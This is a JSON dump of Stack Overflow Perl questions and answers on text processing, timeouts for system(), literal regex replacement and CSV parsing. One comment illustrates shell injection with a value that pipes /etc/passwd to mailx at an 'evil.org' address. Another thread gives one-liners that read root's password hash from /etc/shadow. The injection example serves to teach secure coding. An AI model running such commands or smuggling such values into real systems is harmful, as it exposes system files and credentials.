"https://stackoverflow.com/users/651980/jeff"}, "edited": false, "score": 0, "creation_date": 1520874189, "post_id": 49239668, "comment_id": 85485030, "body": "@Jeff: <i>&quot;Wow this seems to work&quot;</i>. For several reasons it is also likely to be rather faster than slurping gigabytes of data. Developers aren&#39;t trying to screw you over when they implement buffered I/O."}], "tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": true, "score": 4, "last_activity_date": 1520871336, "last_edit_date": 1520871336, "creation_date": 1520870730, "answer_id": 49239668, "question_id": 49239559, "link": "https://stackoverflow.com/questions/49239559/awk-replacement-for-a-multiline-perl-substitution-operation/49239668#49239668", "title": "Awk replacement for a multiline perl substitution operation", "body": "<p>Wouldn't you get the same effect by working linewise? This would bypass the \"long string\" regex bug:</p>\n\n<pre><code>perl -ne 'print unless /^--.*TABLE DATA; Schema: pgq;/ .. ($_ eq \"\\\\.\\n\")'\n</code></pre>\n\n<p>We process the input one line at a time (<code>-n</code>). We print each line unless we're in a chunk that is to be stripped.</p>\n\n<p>The <a href=\"http://perldoc.perl.org/perlop.html#Range-Operators\" rel=\"nofollow noreferrer\"><code>..</code> operator</a> (in scalar context) keeps track of our state (whether we should skip or not). The beginning of a skippable region is marked by the condition <code>/^--.*TABLE DATA; Schema: pgq;/</code> (i.e. a regex match against the current line); the end of a skippable region is marked by <code>$_ eq \"\\\\.\\n\"</code> (i.e. a line containing exactly <code>\\.</code>).</p>\n"}], "owner": {"reputation": 501, "user_id": 651980, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/lS9HK.png?s=128&g=1", "display_name": "Jeff", "link": "https://stackoverflow.com/users/651980/jeff"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 1, "accepted_answer_id": 49239668, "answer_count": 1, "score": 0, "last_activity_date": 1520887655, "creation_date": 1520870380, "last_edit_date": 1520887655, "question_id": 49239559, "link": "https://stackoverflow.com/questions/49239559/awk-replacement-for-a-multiline-perl-substitution-operation", "title": "Awk replacement for a multiline perl substitution operation", "body": "<p>I use this Perl command on to strip out chunks of a database dump. It starts at a commented line which contains the string <code>TABLE DATA; Schema: pgq;</code> and ends later with the character sequence <code>\\.</code> by itself on a line. All matches are deleted.</p>\n\n<pre><code>perl -p0e 's/\\n--[^\\n]*TABLE DATA; Schema: pgq;.*?\\n\\\\\\.\\n//gs'\n</code></pre>\n\n<p>This works except when processing a database dump greater than a couple of gigabytes due to a <a href=\"https://stackoverflow.com/a/34595308/651980\">perl bug that's been fixed in 5.22</a>. I'm stuck on Perl 5.18 (Ubuntu 14.04) and upgrading is not an option.</p>\n\n<p>I'm looking at rewriting the Perl expression using awk and the <code>-vRS</code> and <code>-vORS</code> variables and possibly a <code>gsub</code> operator, but I can't seem to find any examples for my use case. Is it something even possible with awk?</p>\n\n<p>I'm using <code>GNU Awk 4.0.1</code>.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 4, "creation_date": 1520869770, "post_id": 49239266, "comment_id": 85482158, "body": "Use <a href=\"http://search.cpan.org/perldoc?IPC::Run\" rel=\"nofollow noreferrer\">IPC::Run</a>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1520869860, "post_id": 49239266, "comment_id": 85482245, "body": "Note: Your command suffers from shell injection bug. Based on the variable name, you don&#39;t convert the string you inject into a shell literal. IPC::Run will also help you with that."}, {"owner": {"reputation": 63, "user_id": 9317531, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rp3nH.jpg?s=128&g=1", "display_name": "MBW", "link": "https://stackoverflow.com/users/9317531/mbw"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1520873982, "post_id": 49239266, "comment_id": 85484910, "body": "Thanks ikegami. I was wondering if there a better way to write the system command. Do you have a link to the &quot;shell injection bug&quot; reference? I&#39;d like to undertand it. I&#39;m also reading up on the IPC::Run page on MetaCPAN."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1520876491, "post_id": 49239266, "comment_id": 85486413, "body": "<a href=\"https://en.wikipedia.org/wiki/Code_injection\" rel=\"nofollow noreferrer\">Code injection</a>. For example, imagine what happens if <code>$bjoblistfile</code> has a space in it."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1520891766, "post_id": 49239266, "comment_id": 85493979, "body": "Regarding shell injection, what if <code>$bjoblistfile</code> is <code>x; cat &#47;etc&#47;passwd | mailx supervillain@evil.org</code> ? (just an example of course)"}, {"owner": {"reputation": 63, "user_id": 9317531, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rp3nH.jpg?s=128&g=1", "display_name": "MBW", "link": "https://stackoverflow.com/users/9317531/mbw"}, "edited": false, "score": 0, "creation_date": 1520903723, "post_id": 49239266, "comment_id": 85497322, "body": "Ah... I see. Thank you ikegami and haukex. This is an interesting thought. Since I&#39;m the script writer and I set the value of the $bjoblistfile I didn&#39;t think of the issue. Always different perspectives to learn from. Thanks again. Guess I will continue to experiment with IPC::Run for the timeout issue."}], "answers": [{"comments": [{"owner": {"reputation": 63, "user_id": 9317531, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rp3nH.jpg?s=128&g=1", "display_name": "MBW", "link": "https://stackoverflow.com/users/9317531/mbw"}, "edited": false, "score": 0, "creation_date": 1521388359, "post_id": 49288058, "comment_id": 85699445, "body": "Thank you pcjr! This works great and doesn\u2019t need any packages."}], "tags": [], "owner": {"reputation": 399, "user_id": 3420699, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AgkhT.jpg?s=128&g=1", "display_name": "pcjr", "link": "https://stackoverflow.com/users/3420699/pcjr"}, "is_accepted": true, "score": 0, "last_activity_date": 1521063624, "creation_date": 1521063624, "answer_id": 49288058, "question_id": 49239266, "link": "https://stackoverflow.com/questions/49239266/how-to-get-around-system-fork-wait-in-perl/49288058#49288058", "title": "How to get around SYSTEM (fork-wait) in perl?", "body": "<p>Use alarm(). Here's a rough outline:</p>\n\n<pre><code>my $alarm_msg = \"ALARM\\n\";\nmy $status;\neval {\n    local $SIG{ALRM} = sub { die($alarm_msg) };\n    alarm(300);    # set alarm for 5 minutes\n    $status = system(\"shell injection safe command\");\n    alarm(0); # turn off alarm\n};\nif ($@ eq $alarm_msg) {\n     # the alarm went off\n} elsif ($@) {\n     # there's a bug in my code above causing eval to fail\n}\n# perhaps do something with exist status, $status\n</code></pre>\n\n<p>If you really want to use the grep command (as opposed to perl's built-in grep()), consider using just one command:</p>\n\n<pre><code>egrep -v 'GLS|JOBID'\n</code></pre>\n"}], "owner": {"reputation": 63, "user_id": 9317531, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rp3nH.jpg?s=128&g=1", "display_name": "MBW", "link": "https://stackoverflow.com/users/9317531/mbw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 49288058, "answer_count": 1, "score": 0, "last_activity_date": 1521063624, "creation_date": 1520869568, "question_id": 49239266, "link": "https://stackoverflow.com/questions/49239266/how-to-get-around-system-fork-wait-in-perl", "title": "How to get around SYSTEM (fork-wait) in perl?", "body": "<p>I am using the SYSTEM command in perl to launch a Linux system command and I've run into an issue. From the perldocs describing the SYSTEM command it appears that SYSTEM does a Fork-Wait around the system command call. Unfortunately, if the system command hangs up, the Perl program does too. Below is an example of the system command:</p>\n\n<pre><code>system(\"bjobs -w -r |grep -v GLS | grep -v JOBID   &gt; $bjoblistfile\");\n</code></pre>\n\n<p>However, every once in a while the \"bjobs\" command hangs so this system command does not return.</p>\n\n<p>Is there a way to use the SYSTEM command to \"fork-wait\" with a timeout option?</p>\n\n<p>Thanks in advance!</p>\n\n<p>Mark</p>\n"}, {"tags": ["python", "perl", "sed", "replace", "find"], "comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 2, "creation_date": 1520866532, "post_id": 49237365, "comment_id": 85479736, "body": "what are <code>$to_replace</code> and <code>$replace_with</code>?"}, {"owner": {"reputation": 51, "user_id": 3919167, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7596dd8916053eed97bf9cd6808a3a4a?s=128&d=identicon&r=PG&f=1", "display_name": "raffiqu", "link": "https://stackoverflow.com/users/3919167/raffiqu"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1520916364, "post_id": 49237365, "comment_id": 85500430, "body": "to_replace is a variable having the string that needs to be replaced. $to_replace = &quot;a.bb.cc[hk].ccm[<i>].nib[</i>].gion[<i>].der[</i>].sam[<i>].ant[ck].sant[</i>].t&zwnj;&#8203;ags[<i>].rmp&quot;  $replace_with = &quot;dde.be.cc[hk].com[</i>].nib[<i>].gion[</i>].der[<i>].sam[</i>].ant[ck].sant[<i>]&zwnj;&#8203;.tags[</i>].rmp=200&quot;"}], "answers": [{"tags": [], "owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "is_accepted": false, "score": 0, "last_activity_date": 1520917804, "creation_date": 1520917804, "answer_id": 49248696, "question_id": 49237365, "link": "https://stackoverflow.com/questions/49237365/sed-find-a-string-with-special-characters-and-replace-in-a-file/49248696#49248696", "title": "sed - find a string with special characters and replace in a file", "body": "<p>Use the <code>\\Q</code> and <code>\\E</code> escape sequences to disable pattern metacharacters, i.e. just treat them like regular characters to match.  Equivalently, you could just place your search string inside the <code>quotemeta</code> function and then perform <code>s|$search|$replace|g</code> which would now work as you expect.</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse warnings;\nuse strict;\n\nmy $search = 'a.bb.cc[hk].ccm[*].nib[*].gion[*].der[*].sam[*].ant[ck].sant[*].tags[*].rmp';\nmy $replace = 'dde.be.cc[hk].com[*].nib[*].gion[*].der[*].sam[*].ant[ck].sant[*].tags[*].rmp=200';\n\nmy $txt = &lt;&lt;EOTXT;\nThis is some text.\nThe next line needs replacing...\nInside here: &lt; a.bb.cc[hk].ccm[*].nib[*].gion[*].der[*].sam[*].ant[ck].sant[*].tags[*].rmp &gt;\nMore normal text\nEOTXT\n\n# perldoc perlre\n#  s|...|...|   substitute\n# \\Q ... \\E     quote (disable) pattern metacharacters till \\E\n#\n# modifiers:\n# s             treat string as single line\n# g             global\n\n$txt =~ s|\\Q$search\\E|$replace|sg;\nprint $txt;\n</code></pre>\n\n<p><strong>output</strong></p>\n\n<pre><code>This is some text.\nThe next line needs replacing...\nInside here: &lt; dde.be.cc[hk].com[*].nib[*].gion[*].der[*].sam[*].ant[ck].sant[*].tags[*].rmp=200 &gt;\nMore normal text\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 3919167, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7596dd8916053eed97bf9cd6808a3a4a?s=128&d=identicon&r=PG&f=1", "display_name": "raffiqu", "link": "https://stackoverflow.com/users/3919167/raffiqu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 341, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1520917804, "creation_date": 1520863961, "last_edit_date": 1520864001, "question_id": 49237365, "link": "https://stackoverflow.com/questions/49237365/sed-find-a-string-with-special-characters-and-replace-in-a-file", "title": "sed - find a string with special characters and replace in a file", "body": "<p>I have a difficulty in searching a string in a file that has multiple special characters and replace the whole line with some text having special characters.</p>\n\n<p>search string in a file <br></p>\n\n<pre><code>a.bb.cc[hk].ccm[*].nib[*].gion[*].der[*].sam[*].ant[ck].sant[*].tags[*].rmp\n</code></pre>\n\n<p>replace with <br></p>\n\n<pre><code>dde.be.cc[hk].com[*].nib[*].gion[*].der[*].sam[*].ant[ck].sant[*].tags[*].rmp=200\n</code></pre>\n\n<p>tried using linux sed but that needs to escape all these special characters and I do not want to do. These special characters might change for other strings.</p>\n\n<pre><code>perl -e \"s/$to_replace/$replace_with/g\" -pi /tmp/l1 \nsed -i -e \"s/'$to_replace'/'$replace_with'/g\" /tmp/l1\n</code></pre>\n\n<p>both these failed as they expecting escape characters.</p>\n\n<p>Any help here will be appreciated. Thanks</p>\n"}, {"tags": ["regex", "perl", "loops", "foreach"], "comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520856477, "post_id": 49233631, "comment_id": 85472747, "body": "If you find you have lots of capture variables, you could instead use <a href=\"http://perldoc.perl.org/perlretut.html#Named-backreferences\" rel=\"nofollow noreferrer\">named capture groups</a> and the <a href=\"http://perldoc.perl.org/perlvar.html#%+\" rel=\"nofollow noreferrer\"><code>%+</code></a> hash to access them. You can even make a copy of that hash if you want to save the captures for later."}], "answers": [{"tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": true, "score": 4, "last_activity_date": 1520852962, "creation_date": 1520852962, "answer_id": 49233752, "question_id": 49233631, "link": "https://stackoverflow.com/questions/49233631/perl-refer-to-groups-in-foreach-loop/49233752#49233752", "title": "perl: refer to groups in foreach loop", "body": "<p>Why loop twice (<code>grep</code>, <code>foreach</code>)? You can do it all in one loop:</p>\n\n<pre><code>foreach my $line (@lines)\n{\n    if ($line =~ /,\\s(SEP[A-F0-9]*),\\s(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}),\\s(\\+\\d+),\\s.*,\\s(\\w+)\\n$/)\n    {\n        print \"$1,$2,$3,$4\\n\";\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1520879380, "creation_date": 1520879380, "answer_id": 49242184, "question_id": 49233631, "link": "https://stackoverflow.com/questions/49233631/perl-refer-to-groups-in-foreach-loop/49242184#49242184", "title": "perl: refer to groups in foreach loop", "body": "<p>Don't hand-parse and hand-generate CSV! It's simpler and cleaner to use a CSV parser.</p>\n\n<pre><code>use Text::CSV_XS qw( );\n\nmy $fh_in  = ...;\nmy $fh_out = \\*STDOUT;\n\nmy $csv_in  = Text::CSV_XS-&gt;new({ binary =&gt; 1, auto_diag =&gt; 2, sep =&gt; ', ' });\nmy $csv_out = Text::CSV_XS-&gt;new({ binary =&gt; 1, auto_diag =&gt; 2 });\n\nwhile ( my $row = $csv_in-&gt;getline($fh_in) ) {\n    $csv_out-&gt;say($fh_out, [ @$row[-4,-3,-2,-1] ]\n       if $row-&gt;[-4] =~ /^SEP[A-F0-9]*\\z/\n       &amp;&amp; $row-&gt;[-3] =~ /^\\d{1,3}(?:\\.\\d{1,3}){3}\\z/\n       &amp;&amp; $row-&gt;[-2] =~ /^\\+\\d+\\z/\n       &amp;&amp; $row-&gt;[-1] =~ /^\\w+\\z/;\n}\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 9433460, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/8bb4869797b3c1c0823720661b0499ca?s=128&d=identicon&r=PG&f=1", "display_name": "steba", "link": "https://stackoverflow.com/users/9433460/steba"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 49233752, "answer_count": 2, "score": 1, "last_activity_date": 1520879380, "creation_date": 1520852599, "question_id": 49233631, "link": "https://stackoverflow.com/questions/49233631/perl-refer-to-groups-in-foreach-loop", "title": "perl: refer to groups in foreach loop", "body": "<p>Can I refer to groups in a foreach loop? my code below works:</p>\n\n<pre><code>@SEP_line=grep(/,\\s(SEP[A-F0-9]*),\\s(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}),\\s(\\+\\d+),\\s.*,\\s(\\w+)\\n$/, @lines);\n\nforeach (@SEP_line)\n{\n    /,\\s(SEP[A-F0-9]*),\\s(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}),\\s(\\+\\d+),\\s.*,\\s(\\w+)\\n$/;\n\n    print $1.\",\".$2.\",\".$3.\",\".$4.\"\\n\";\n}\n</code></pre>\n\n<p>Since I already specified the match regex in @SEP_line definition, I'd do something like this:</p>\n\n<pre><code>@SEP_line=grep(/,\\s(SEP[A-F0-9]*),\\s(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}),\\s(\\+\\d+),\\s.*,\\s(\\w+)\\n$/, @lines);\n\nforeach (@SEP_line)\n{\n    print @SEP_line[$1].\",\".@SEP_line[$2].\",\".@SEP_line[$3].\"\\n\";\n}\n</code></pre>\n\n<p>This doesnt work. Thanks in advance</p>\n"}, {"tags": ["perl", "awk", "passwords", "shadow"], "comments": [{"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1520867194, "post_id": 49233122, "comment_id": 85480243, "body": "Depends what you mean by &quot;better&quot;. awk is standard on every UNIX box while perl is not and in some cases you&#39;re not allowed to install it or any other non-standard tools so that&#39;s one measure. Awk is a very small language designed to ONLY manipulate text while perl is a very large language designed to manipulate text and do everything a shell can do so awk is &quot;better&quot; if you&#39;re just manipulating text while perl is &quot;better&quot; if you&#39;re doing anything in addition to that. awk regexps are fast but perl regexps while slower have extra functionality so again &quot;better&quot; is in the eye of the beholder"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1520867480, "post_id": 49233122, "comment_id": 85480445, "body": "For <b>this kind of task</b> awk is better as it&#39;s portable across all UNIX boxes plus (apparently from the answer you got) briefer, clearer (no-one draws images like <a href=\"http://geekshumor.com/wp-content/uploads/2013/06/perl-scripts-done.png\" rel=\"nofollow noreferrer\">geekshumor.com/wp-content/uploads/2013/06/perl-scripts-done.&zwnj;&#8203;png</a> about awk syntax!) and probably faster than a perl equivalent."}, {"owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1520965828, "post_id": 49233122, "comment_id": 85530291, "body": "Valid points, but 1) Few UNIX boxes lack Perl, the chances of eswues happening to be on such a box are well below 1%, 2) Perl syntax is as clear as you choose to make it 3) Perl has advantages over awk, e.g. it can do a lot more than text processing; but eswues may not need those things."}], "answers": [{"comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1520855146, "post_id": 49234409, "comment_id": 85471864, "body": "<a href=\"http://perldoc.perl.org/perl5200delta.html#%2A-F%2A-now-implies-%2A-a%2A-and-%2A-a%2A-implies-%2A-n%2A\" rel=\"nofollow noreferrer\">In Perl before v5.20</a>, that&#39;ll have to be <code>perl -anF: -e ...</code>"}, {"owner": {"reputation": 4598, "user_id": 145364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fdd3f07ac5b720b510dc17843ab9d37?s=128&d=identicon&r=PG", "display_name": "Jim Davis", "link": "https://stackoverflow.com/users/145364/jim-davis"}, "edited": false, "score": 1, "creation_date": 1520861211, "post_id": 49234409, "comment_id": 85475889, "body": "In Perl&#39;s after 5.8, you can trim that down a little with <code>-E &#39;say $F[1] if \u2026</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1520863992, "post_id": 49234409, "comment_id": 85477881, "body": "The main difference is when you find that your awk program cannot be enhanced to fulfil a new requirement. At that point it would have been much easier to have used Perl in the first place."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 4598, "user_id": 145364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fdd3f07ac5b720b510dc17843ab9d37?s=128&d=identicon&r=PG", "display_name": "Jim Davis", "link": "https://stackoverflow.com/users/145364/jim-davis"}, "edited": false, "score": 1, "creation_date": 1520869399, "post_id": 49234409, "comment_id": 85481880, "body": "@Jim Davis, <code>-E</code> isn&#39;t forward compatible. You shouldn&#39;t use it in production. (And switching to <code>say</code> doesn&#39;t address the missing <code>chomp</code> like <code>-l</code> does.)"}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": true, "score": 1, "last_activity_date": 1520869163, "last_edit_date": 1520869163, "creation_date": 1520854971, "answer_id": 49234409, "question_id": 49233122, "link": "https://stackoverflow.com/questions/49233122/get-password-from-etc-shadow-awk-vs-perl/49234409#49234409", "title": "get password from /etc/shadow \u2014 awk vs Perl", "body": "<p>Perl has the switch <code>-F</code> to define a delimiter and turn on autosplitting into the array <code>@F</code>. Thus:</p>\n\n<pre><code>perl -F: -le 'print $F[1] if /root/' /etc/shadow     # Perl 5.20+\n</code></pre>\n\n<p>and</p>\n\n<pre><code>perl -anF: -le 'print $F[1] if /root/' /etc/shadow\n</code></pre>\n\n<p>will do the same as </p>\n\n<pre><code>awk -F: '/root/ {print $1}' /etc/shadow\n</code></pre>\n\n<p>I don't see a <em>real</em> difference between both.</p>\n"}], "owner": {"reputation": 53, "user_id": 6562007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh5.googleusercontent.com/-QWsomkOotYI/AAAAAAAAAAI/AAAAAAAACo4/UWgCqxfwhEw/photo.jpg?sz=128", "display_name": "eswues", "link": "https://stackoverflow.com/users/6562007/eswues"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 160, "favorite_count": 0, "accepted_answer_id": 49234409, "answer_count": 1, "score": 0, "last_activity_date": 1520869163, "creation_date": 1520851042, "last_edit_date": 1520864173, "question_id": 49233122, "link": "https://stackoverflow.com/questions/49233122/get-password-from-etc-shadow-awk-vs-perl", "title": "get password from /etc/shadow \u2014 awk vs Perl", "body": "<p>I am wondering how to achieve this functionality in Perl</p>\n\n<pre><code>cat /etc/shadow | awk -F \":\" '/root/{print $2}'\n</code></pre>\n\n<p>It would be nice to have your opinion what is better for this kind of task: Perl or awk.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 2, "creation_date": 1520850793, "post_id": 49232958, "comment_id": 85469348, "body": "Hint, <code>my $newstr = $str =~s&#47;...&#47;&#47;r;</code> or <code>(my $newstr = $str) =~s&#47;...&#47;&#47;;</code>"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1520851360, "post_id": 49232958, "comment_id": 85469660, "body": "@\u0421\u0443\u0445\u043e\u043927: <code>my $newstr = $str =~s&#47;(\\d+)&#47;$1+1&#47;er;</code> thanks its working but preceding zero <code>0</code> lost..."}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1520851396, "post_id": 49232958, "comment_id": 85469685, "body": "it should be <code>tool_v02.zip</code> getting output <code>tool_v2.zip</code>"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 3, "creation_date": 1520852438, "post_id": 49232958, "comment_id": 85470288, "body": "you&#39;re not formatting <code>$1+1</code> so of course it&#39;d lose the preceding zeros"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1520854136, "post_id": 49232958, "comment_id": 85471254, "body": "@ChrisTurner: That&#39;s why I am asking how to do this."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520864488, "post_id": 49232958, "comment_id": 85478268, "body": "@ssr1012: Your question asks how to use the <code>&#47;r</code> modifier, not how to retain leading zeroes after the arithmetic has been applied."}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": 